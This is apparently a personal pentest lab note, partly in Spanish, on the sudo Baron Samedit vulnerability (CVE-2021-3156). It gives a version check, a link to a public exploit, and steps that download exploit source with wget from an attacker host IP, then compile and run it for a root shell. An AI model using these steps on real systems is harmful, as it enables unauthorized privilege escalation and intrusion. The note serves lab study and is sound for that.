sud## DESCRIPTION
#### Root shell PoC for CVE-2021-3156 (no bruteforce)

For educational purposes etc.

Tested on Ubuntu 20.04 against sudo 1.8.31

All research credit: **Qualys Research Team** Check out the details on their [blog](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit).

You can check your version of sudo is vulnerable with: `$ sudoedit -s Y`. If it asks for your password it's most likely vulnerable, if it prints usage information it isn't. You can downgrade to the vulnerable version on Ubuntu 20.04

Winpeas:

![[Pasted image 20230425132616.png]]


#### Mas información
* https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit


## EXPLOITATION

1. Descargamos el exploit: https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit

![[Pasted image 20230425132811.png]]

2. Lo transferimos a la máquina:

```
wget http://192.168.119.166:7777/Makefile
wget http://192.168.119.166:7777/exploit.c
wget http://192.168.119.166:7777/shellcode.c
```

3. Compilamos y ejecutamos:

```
$ make

$ ./exploit
```

![[Pasted image 20230425132834.png]]

## MACHINES

* Hack The Box: 

